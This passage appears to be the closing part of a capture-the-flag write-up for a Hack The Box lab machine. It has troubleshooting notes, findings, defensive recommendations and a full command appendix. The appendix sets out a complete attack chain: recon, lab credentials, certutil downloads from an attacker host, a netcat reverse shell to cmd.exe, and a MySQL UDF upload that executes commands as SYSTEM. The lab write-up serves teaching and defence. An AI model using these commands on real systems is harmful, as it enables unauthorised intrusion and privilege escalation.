HTTP/1.1 302 Found
Location: /login
```

Create the cookie file by authenticating first:

```bash
curl -sS -i \
  -c touch_cookies.txt \
  -X POST 'http://10.129.13.167:8443/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'password=NX-DH-2024-B7042'
```

Then use the saved cookie with `-b touch_cookies.txt`.

### 15.4 Dashboard URL typo

The misspelled URL `/deshboard` returned no useful output. The correct URL is:

```text
/dashboard
```

### 15.5 CMD commands versus PowerShell/Linux commands

The reverse shell was a Windows CMD prompt. Commands such as `pwd` and `ls` are not native CMD commands and returned misleading localized messages in this shell.

Use these CMD equivalents:

| Purpose | Windows CMD command |
|---|---|
| Current directory | `cd` |
| List files | `dir` |
| Change directory | `cd /d C:\path` |
| Read a file | `type filename` |
| Current identity | `whoami` |

The `Test-NetConnection` command is a PowerShell command, not a CMD command. A direct HTTP test from CMD worked:

```cmd
curl.exe -I http://10.10.14.4:9000/nc.exe
```

### 15.6 `DNS server not authoritative for zone` / `DNS bad key` messages

The Windows shell printed messages such as:

```text
DNS server not authoritative for zone.
DNS bad key.
The system cannot find message text for message number ...
```

These messages appeared around unsupported commands (`pwd`, `ls`) and some `dir` output. The valid Windows commands still returned useful directory and file information. Use native CMD commands (`cd`, `dir`, `type`) and focus on their actual output.

### 15.7 RDP warnings and disconnects

FreeRDP printed warnings including:

```text
Using /p is insecure
SSL_NOT_ALLOWED_BY_SERVER
ERRINFO_RPC_INITIATED_DISCONNECT
ERRCONNECT_CONNECT_CANCELLED
```

The session nevertheless initialized and displayed the remote desktop on successful attempts. `ERRCONNECT_CONNECT_CANCELLED` also appeared after manually pressing `Ctrl+C`.

The RDP command used was:

```bash
xfreerdp /v:10.129.13.167 \
  /u:KioskUser \
  /p:'K!0sk2026#' \
  /cert:ignore \
  /dynamic-resolution
```

### 15.8 Netcat interactive MySQL prompt

An interactive MySQL login was attempted from the basic reverse shell:

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p -h 127.0.0.1 -P 3306
```

The interactive prompt did not work reliably through the shell. Non-interactive SQL execution using `-e` was reliable:

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -e "SHOW DATABASES;"
```

### 15.9 MySQL command-line password warning

MySQL repeatedly displayed:

```text
[Warning] Using a password on the command line interface can be insecure.
```

This is a warning, not a failed authentication. The queries completed successfully. In a real environment, avoid exposing passwords in process arguments or shell history; the direct command-line form is shown here because it was used in this isolated lab session.

### 15.10 Zsh history corruption warning on Kali

Kali displayed:

```text
zsh: corrupt history file /root/.zsh_history
```

A recovery approach suggested during the session was:

```bash
cp -a /root/.zsh_history /root/.zsh_history.bak
strings /root/.zsh_history.bak > /tmp/zsh_history.recovered
mv /tmp/zsh_history.recovered /root/.zsh_history
chmod 600 /root/.zsh_history
exec zsh
```

This preserves a backup first and recovers printable history strings. It may not preserve every original history entry or metadata.

### 15.11 Image inspection command typo

The following command was incorrect:

```bash
xxd lastcap.bin | head -d
```

`head` does not support `-d` as used there. The working command was:

```bash
xxd lastcap.bin | head -30
```

### 15.12 Scanner marker and `proto` tests

The marker request returned `{"success":true}`, but the subsequent `grep` returned no match. Record this as a successful settings API request, not as proof of XSS.

The `proto` JSON request also returned `{"success":true}` after authentication. This does not prove role escalation; no authorization change was established by that response alone.

---

## 16. Key Findings and Lessons Learned

1. **Device serial disclosure:** `/api/status` exposed the DeviceHub serial number, and the login page explicitly stated that the serial was the default device password.
2. **Sensitive dashboard disclosure:** The authenticated dashboard exposed the kiosk account credentials through client-side HTML and “show” controls.
3. **Kiosk escape:** The scanner shutdown/error workflow led to a browser context that could open Windows `cmd.exe`.
4. **Application credential exposure:** The backend source contained default MySQL application credentials and a database name.
5. **Maintenance script credential exposure:** `refresh-dates.bat` contained the MySQL root password in clear text.
6. **Over-privileged MySQL account:** The MySQL root account had the `FILE` privilege.
7. **Insecure plugin directory permissions:** `Authenticated Users` had Modify permissions on the MySQL plugin directory.
8. **UDF-based OS command execution:** The `sys_eval` UDF executed commands in the MySQL server process context, confirmed as `NT AUTHORITY\SYSTEM`.
9. **Both flags retrieved:** `user.txt` and `root.txt` were read successfully through the UDF.

### Defensive recommendations

- Do not expose device serial numbers or other authentication material through unauthenticated status endpoints.
- Replace default device passwords with unique, securely generated credentials.
- Do not embed credentials in frontend HTML or client-side JavaScript.
- Store database credentials in a protected secrets store and restrict access to configuration files.
- Do not hardcode privileged database credentials in batch scripts or source code.
- Apply least-privilege grants to application database accounts.
- Avoid granting `FILE` to MySQL accounts unless strictly required.
- Restrict MySQL plugin directories so ordinary authenticated users cannot modify them.
- Run database services under a dedicated low-privilege Windows service account rather than `LocalSystem` where possible.
- Restrict kiosk browser capabilities and prevent access to local executables or arbitrary file paths.
- Log and alert on unexpected UDF creation and plugin-library changes.

---

## Appendix A — Consolidated Command Reference

### Reconnaissance

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.129.13.167
nmap -sV -sC -Pn -p- 10.129.13.167
ffuf -u http://10.129.13.167:8443/FUZZ -recursion -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0 -s
ffuf -u http://10.129.13.167:8443/api/FUZZ -recursion -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0 -s
```

### DeviceHub login and API

```bash
curl http://10.129.13.167:8443/login
curl -sS -i 'http://10.129.13.167:8443/api/status'
curl -sS -i -c touch_cookies.txt -X POST 'http://10.129.13.167:8443/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'password=NX-DH-2024-B7042'
curl -sS -i -b touch_cookies.txt 'http://10.129.13.167:8443/dashboard'
curl -sS -i -b touch_cookies.txt 'http://10.129.13.167:8443/scanner'
curl -sS -b touch_cookies.txt -D lastcap.headers -o lastcap.jpg 'http://10.129.13.167:8443/api/scan/last-capture'
curl -s -b touch_cookies.txt -X PUT 'http://10.129.13.167:8443/api/scanner/settings' -H 'Content-Type: application/json' -d '{"resolution":"XSSPROBE123","format":"JPEG","mrzDetection":true,"autoCalibrate":true}'
curl -s -b touch_cookies.txt 'http://10.129.13.167:8443/scanner' | grep -i 'XSSPROBE123'
curl -i -b touch_cookies.txt -X PUT 'http://10.129.13.167:8443/api/scanner/settings' -H 'Content-Type: application/json' -d '{"proto":{"admin":true,"isAdmin":true,"role":"admin"}}'
```

### RDP and file transfer

```bash
xfreerdp /v:10.129.13.167 /u:KioskUser /p:'K!0sk2026#' /cert:ignore /dynamic-resolution
ip -4 addr show tun0
mkdir -p /tmp/touch-share
cp /usr/share/windows-resources/binaries/nc.exe /tmp/touch-share/
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll /tmp/touch-share/
cd /tmp/touch-share
python3 -m http.server 9000
ss -lntp | grep ':9000'
nc -lvnp 9090
```

Windows CMD:

```cmd
curl.exe -I http://10.10.14.4:9000/nc.exe
certutil.exe -urlcache -split -f http://10.10.14.4:9000/nc.exe "%USERPROFILE%\Downloads\nc.exe"
nc.exe -e cmd.exe 10.10.14.4 9090
whoami
hostname
whoami /priv
netstat -ano | findstr :3306
```

### MySQL enumeration and escalation

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -e "SHOW DATABASES;"
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -D htb_airways -e "SHOW TABLES;"
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -D htb_airways -e "SHOW COLUMNS FROM _htb_staff;"
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -D htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
C:\MySQL\bin\mysql.exe -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -P 3306 -e "SHOW GRANTS;"
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT USER(), CURRENT_USER();"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT user,host,File_priv FROM mysql.user WHERE user='root';"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SHOW VARIABLES LIKE 'plugin_dir';"
icacls "C:\MySQL\lib\plugin"
certutil.exe -urlcache -split -f http://10.10.14.4:9000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT sys_eval('whoami');"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT sys_eval('type C:\\Users\\KioskUser\\Desktop\\user.txt');"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -P 3306 -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
```

---

**End of write-up — HTB Touch successfully completed with both flags retrieved.**
